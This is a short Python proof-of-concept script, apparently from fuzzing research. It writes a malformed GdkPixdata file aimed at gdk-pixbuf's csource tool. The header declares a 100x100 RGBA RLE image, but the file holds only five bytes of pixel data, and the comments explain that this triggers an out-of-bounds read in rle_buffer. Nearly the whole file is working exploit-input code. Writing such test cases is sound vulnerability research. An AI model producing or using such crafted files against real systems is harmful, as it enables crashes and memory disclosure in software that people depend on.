import struct, os

POC_DIR = "/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixbuf-csource_c"

MAGIC = 0x47646b50
# pixdata_type: COLORSPACE_RGB(0x02) | SAMPLE_WIDTH_8(0x010000) | ENCODING_RLE(0x02000000)
PIXDATA_TYPE_RGBA_RLE = 0x02010002

width = 100
height = 100
bpp = 4
rowstride = width * bpp  # 400
# Total output needed: 100 * 400 = 40000 bytes

# pixel_data: only one constant RLE run, covers 127 pixels = 508 bytes
# Leaves 39492 bytes of output unfilled -> rle_buffer reads OOB after 5 bytes consumed
pixel_data = bytes([
    0xFF,                      # constant run header: length = 0xFF - 128 = 127
    0xFF, 0xFF, 0xFF, 0xFF,    # RGBA pixel value (opaque white)
])

total_length = 24 + len(pixel_data)  # 29

header = struct.pack(">IIIIII",
    MAGIC,
    total_length,
    PIXDATA_TYPE_RGBA_RLE,
    rowstride,
    width,
    height,
)

data = header + pixel_data
outpath = os.path.join(POC_DIR, "vuln_002.gdkp")
with open(outpath, "wb") as f:
    f.write(data)
print(f"Generated {outpath} ({len(data)} bytes)")
print(f"  Header: magic=0x{MAGIC:08X}, length={total_length}, type=0x{PIXDATA_TYPE_RGBA_RLE:08X}")
print(f"  Image: {width}x{height} RGBA, rowstride={rowstride}")
print(f"  pixel_data: {len(pixel_data)} bytes (covers only 127 of {width*height} pixels)")
print(f"  Expected: rle_buffer OOB read after pixel_data[4] exhausted")
